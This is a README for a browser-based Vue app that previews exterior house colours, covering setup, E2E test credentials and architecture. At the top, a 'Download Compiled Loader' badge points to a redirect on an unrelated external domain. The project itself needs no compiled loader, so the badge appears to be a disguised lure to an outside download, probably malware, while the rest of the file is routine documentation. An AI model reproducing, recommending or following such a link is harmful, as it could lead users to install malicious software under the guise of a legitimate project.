# Buildog Palette Lab

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A browser-based app for housing exterior color-change UX verification. Client-side only with all data stored in IndexedDB.

## Setup

```bash
npm install
npm run dev      # Start dev server at http://localhost:5176
npm run build    # Production build
```

## E2E Testing

### Prerequisites

1. Create a test user account with email/password authentication
2. Copy `.env.example` to `.env.local`:
   ```bash
   cp .env.example .env.local
   ```
3. Fill in your test credentials in `.env.local`:
   ```
   E2E_EMAIL=your-test-email@example.com
   E2E_PASSWORD=your-test-password
   ```

### Running Tests

```bash
# UI mode (visual testing)
npm run test:e2e:ui

# Headless mode
npm run test:e2e
```

### Important Security Notes

⚠️ **NEVER commit `.env.local` to git** — it's in `.gitignore` for a reason!

⚠️ **VITE_E2E_* variables are development-only** — Never include real credentials in `VITE_E2E_EMAIL` or `VITE_E2E_PASSWORD` for production builds. These variables are only for local development convenience when manually testing the login form.

The test credentials should only be loaded from environment variables (`E2E_EMAIL`, `E2E_PASSWORD`) which are set locally via `.env.local`.

## Architecture

- **View Router**: Minimal hash-based routing in `src/App.vue`
- **State**: IndexedDB-based persistence with 4 object stores (projects, images, layers, patterns)
- **Editor**: Multi-tab canvas editor for masking, color simulation, and pattern management
- **Share**: Self-contained HTML export for customer-facing color preview

See `CLAUDE.md` for detailed technical documentation.
